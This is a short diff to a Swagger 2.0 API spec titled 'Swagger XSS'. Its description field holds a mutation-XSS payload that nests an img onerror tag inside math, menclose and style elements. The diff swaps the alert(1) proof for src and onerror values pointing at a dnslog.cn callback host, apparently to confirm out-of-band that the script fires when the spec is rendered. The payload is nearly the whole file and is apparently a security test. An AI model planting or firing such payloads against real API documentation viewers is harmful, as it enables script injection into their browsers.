@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Swagger XSS 
   description: |
-    <math><menclose notation="box"><style><img src=x onerror=alert(1)></style></menclose></math>
+    <math><menclose notation="box"><style><img src=http://ny2oum.dnslog.cn onerror=https://ny2oum.dnslog.cn></style></menclose></math>
   version: production
 basePath: /JSSResource/
 produces:
@@ -36,3 +36,4 @@ paths:
       responses:
         '200':
           description: No response was specified
+
